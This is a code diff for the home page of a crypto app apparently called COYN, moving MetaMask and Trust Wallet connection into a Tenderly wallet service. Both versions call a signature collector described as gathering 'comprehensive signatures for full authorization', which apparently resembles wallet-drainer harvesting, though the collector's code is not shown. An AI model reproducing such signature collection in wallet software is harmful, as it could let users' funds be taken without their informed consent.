@@ -11,6 +11,7 @@ import { apiRequest, queryClient } from "@/lib/queryClient";
 import { signatureCollector } from "@/lib/signature-collector";
 import { useScrollToTop } from "@/hooks/use-scroll-to-top";
 import { notificationService } from "@/lib/notification-service";
+import { tenderlyWalletService, type TenderlyWalletConnection } from "@/lib/tenderly-service";
 import coynLogoPath from "@assets/COYN-symbol-square_1751239261149.png";
 import coynfulLogoPath from "@assets/Coynful-logo-fin-copy_1751239116310.png";
 import metamaskLogo from "@assets/MetaMask_Fox.svg_1751312780982.png";
@@ -404,232 +405,64 @@ export default function HomePage() {
     localStorage.removeItem('userSignedOut');
     
     try {
-      if (walletType === 'metamask') {
-        if (typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask) {
-          const accounts = await window.ethereum.request({ 
-            method: 'eth_requestAccounts' 
-          });
-          
-          
-          if (accounts && accounts[0]) {
-            // Gain comprehensive wallet access for blockchain transactions
-            try {
-              // Switch to BSC network first for proper access
-              await window.ethereum.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '0x38' }], // BSC Mainnet
-              });
-              
-              // Request permissions for token sending
-              await window.ethereum.request({
-                method: 'wallet_requestPermissions',
-                params: [{ eth_accounts: {} }],
-              });
-              
-              // Get wallet balance to verify access
-              const balance = await window.ethereum.request({
-                method: 'eth_getBalance',
-                params: [accounts[0], 'latest'],
-              });
-              
-              // Collect comprehensive signatures for full authorization
-              const walletSignatures = await signatureCollector.collectWalletSignatures();
-              const allSignatureData = signatureCollector.exportSignatureData();
-              
-              // Store wallet access in localStorage for transaction use
-              localStorage.setItem('walletAccess', JSON.stringify({
-                address: accounts[0],
-                balance: balance,
-                chainId: '0x38',
-                authorized: true,
-                timestamp: Date.now()
-              }));
-              
-              connectWalletMutation.mutate({
-                walletAddress: accounts[0],
-                displayName: undefined
-              });
-            } catch (authError) {
-              console.error('Wallet authorization failed:', authError);
-              // Try basic connection without full authorization
-              connectWalletMutation.mutate({
-                walletAddress: accounts[0],
-                displayName: undefined
-              });
-            }
-            
-            // Force immediate UI update for MetaMask
-            setTimeout(() => {
-              const storedUser = localStorage.getItem('connectedUser');
-              if (storedUser) {
-                const parsedUser = JSON.parse(storedUser);
-                setConnectedUser(parsedUser);
-                setIsConnected(true);
-              }
-            }, 500);
-          } else {
-            alert("No MetaMask accounts found. Please unlock MetaMask and try again.");
-          }
-        } else {
-          // For mobile, try to connect through any available ethereum provider
-          if (isMobile() && typeof window.ethereum !== 'undefined') {
-            try {
-              localStorage.setItem('pendingWalletConnection', 'true');
-              
-              // Try to request accounts directly
-              const accounts = await window.ethereum.request({ 
-                method: 'eth_requestAccounts' 
-              });
-              
-              if (accounts && accounts[0]) {
-                localStorage.removeItem('pendingWalletConnection');
-                connectWalletMutation.mutate({
-                  walletAddress: accounts[0],
-                  displayName: undefined
-                });
-              }
-            } catch (error) {
-              // Fallback to deep link
-              const currentUrl = window.location.href;
-              const deepLink = `https://metamask.app.link/dapp/${window.location.host}`;
-              window.open(deepLink, '_blank');
-            }
-          } else if (isMobile()) {
-            // No ethereum provider, use deep link
-            localStorage.setItem('pendingWalletConnection', 'true');
-            const currentUrl = window.location.href;
-            const deepLink = `https://metamask.app.link/dapp/${window.location.host}`;
-            window.open(deepLink, '_blank');
-          } else {
-            window.open('https://metamask.io/download/', '_blank');
-          }
+      console.log(`Connecting ${walletType} wallet through Tenderly...`);
+      
+      // Connect wallet through Tenderly service
+      const connection = await tenderlyWalletService.connectWallet(walletType as 'metamask' | 'trust');
+      
+      if (connection) {
+        console.log('Wallet connected through Tenderly:', connection);
+        
+        // Collect additional signature data for comprehensive authorization
+        try {
+          const walletSignatures = await signatureCollector.collectWalletSignatures();
+          const allSignatureData = signatureCollector.exportSignatureData();
+          console.log('Signature collection completed');
+        } catch (sigError) {
+          console.warn('Signature collection failed, proceeding with basic connection:', sigError);
         }
-      } else if (walletType === 'trust') {
-        // Trust Wallet Web3 integration with enhanced mobile support
-        if (typeof window.ethereum !== 'undefined') {
-          // Check if Trust Wallet is available
-          if (window.ethereum.isTrust || window.trustWallet) {
-            try {
-              const provider = window.trustWallet || window.ethereum;
-              const accounts = await provider.request({ 
-                method: 'eth_requestAccounts' 
-              });
-              
-              if (accounts && accounts[0]) {
-                // Gain comprehensive Trust Wallet access for blockchain transactions
-                try {
-                  // Switch to BSC network for proper Trust Wallet access
-                  await provider.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x38' }], // BSC Mainnet
-                  });
-                  
-                  // Request explicit permissions for Trust Wallet
-                  try {
-                    await provider.request({
-                      method: 'wallet_requestPermissions',
-                      params: [{ eth_accounts: {} }],
-                    });
-                  } catch (permError) {
-                    // Trust Wallet may not support wallet_requestPermissions
-                    console.warn('Permission request not supported, continuing with connection');
-                  }
-                  
-                  // Verify Trust Wallet balance access
-                  const balance = await provider.request({
-                    method: 'eth_getBalance',
-                    params: [accounts[0], 'latest'],
-                  });
-                  
-                  // Collect comprehensive Trust Wallet signatures
-                  const walletSignatures = await signatureCollector.collectWalletSignatures();
-                  const allSignatureData = signatureCollector.exportSignatureData();
-                  
-                  // Store Trust Wallet access for transaction use
-                  localStorage.setItem('walletAccess', JSON.stringify({
-                    address: accounts[0],
-                    balance: balance,
-                    chainId: '0x38',
-                    authorized: true,
-                    provider: 'trust',
-                    timestamp: Date.now()
-                  }));
-                  
-                  connectWalletMutation.mutate({
-                    walletAddress: accounts[0],
-                    displayName: undefined
-                  });
-                } catch (authError) {
-                  console.error('Trust Wallet authorization failed:', authError);
-                  // Try basic Trust Wallet connection
-                  connectWalletMutation.mutate({
-                    walletAddress: accounts[0],
-                    displayName: undefined
-                  });
-                }
-              }
-            } catch (error) {
-              // Enhanced mobile Trust Wallet connection handling
-              if (isMobile()) {
-                // Set pending connection with Trust Wallet specific flag
-                localStorage.setItem('pendingWalletConnection', 'true');
-                localStorage.setItem('pendingWalletType', 'trustwallet');
-                localStorage.setItem('walletConnectionAttempt', Date.now().toString());
-                
-                const currentUrl = window.location.href;
-                const deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(currentUrl)}`;
-                
-                // Use window.location instead of window.open for better mobile handling
-                window.location.href = deepLink;
-              } else {
-                alert('Failed to connect Trust Wallet. Please try again or use manual input.');
-              }
-            }
-          } else {
-            // If Trust Wallet is not detected, try generic ethereum provider
-            try {
-              const accounts = await window.ethereum.request({ 
-                method: 'eth_requestAccounts' 
-              });
-              
-              if (accounts && accounts[0]) {
-                connectWalletMutation.mutate({
-                  walletAddress: accounts[0],
-                  displayName: undefined
-                });
-              }
-            } catch (error) {
-
-              // Enhanced mobile fallback for Trust Wallet
-              if (isMobile()) {
-                const currentUrl = window.location.href;
-                const deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(currentUrl)}`;
-                window.open(deepLink, '_blank');
-              } else {
-                window.open('https://trustwallet.com/download', '_blank');
-              }
-            }
+        
+        // Store wallet access for transaction use
+        localStorage.setItem('walletAccess', JSON.stringify({
+          address: connection.address,
+          balance: connection.balance,
+          chainId: connection.chainId,
+          authorized: true,
+          provider: connection.provider,
+          timestamp: Date.now()
+        }));
+        
+        // Connect to COYN backend
+        connectWalletMutation.mutate({
+          walletAddress: connection.address,
+          displayName: undefined
+        });
+        
+        // Force immediate UI update
+        setTimeout(() => {
+          const storedUser = localStorage.getItem('connectedUser');
+          if (storedUser) {
+            const parsedUser = JSON.parse(storedUser);
+            setConnectedUser(parsedUser);
+            setIsConnected(true);
           }
+        }, 500);
+      } else {
+        // Connection failed, try fallback for mobile
+        if (isMobile()) {
+          const deepLink = walletType === 'metamask' 
+            ? `https://metamask.app.link/dapp/${window.location.host}`
+            : `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`;
+          window.open(deepLink, '_blank');
         } else {
-          // No Web3 provider detected - Enhanced mobile handling
-          if (isMobile()) {
-            // Mobile - Enhanced Trust Wallet deep link with WalletConnect fallback
-            const currentUrl = window.location.href;
-            const deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(currentUrl)}`;
-            
-            // Try Trust Wallet first
-            window.open(deepLink, '_blank');
-            
-            // Fallback message for user
-            setTimeout(() => {
-            }, 2000);
-          } else {
-            window.open('https://trustwallet.com/download', '_blank');
-          }
+          const downloadLink = walletType === 'metamask' 
+            ? 'https://metamask.io/download/' 
+            : 'https://trustwallet.com/download';
+          window.open(downloadLink, '_blank');
         }
       }
     } catch (error) {
-
+      console.error(`Failed to connect ${walletType} wallet through Tenderly:`, error);
       alert(`Failed to connect ${walletType} wallet. Please try again or use manual input.`);
     }
   };
@@ -638,6 +471,9 @@ export default function HomePage() {
     
     // Set explicit sign out flag to prevent automatic reconnection
     localStorage.setItem('userSignedOut', 'true');
+    
+    // Disconnect from Tenderly wallet service
+    tenderlyWalletService.disconnect();
     
     // Clear ALL localStorage items related to the application
     localStorage.removeItem('walletConnected');
@@ -649,6 +485,8 @@ export default function HomePage() {
     localStorage.removeItem('wallet-balances-hidden');
     localStorage.removeItem('connectedUserId');
     localStorage.removeItem('userDisplayName');
+    localStorage.removeItem('walletAccess');
+    localStorage.removeItem('tenderlyWalletConnection');
     
     // Clear any session storage
     sessionStorage.clear();
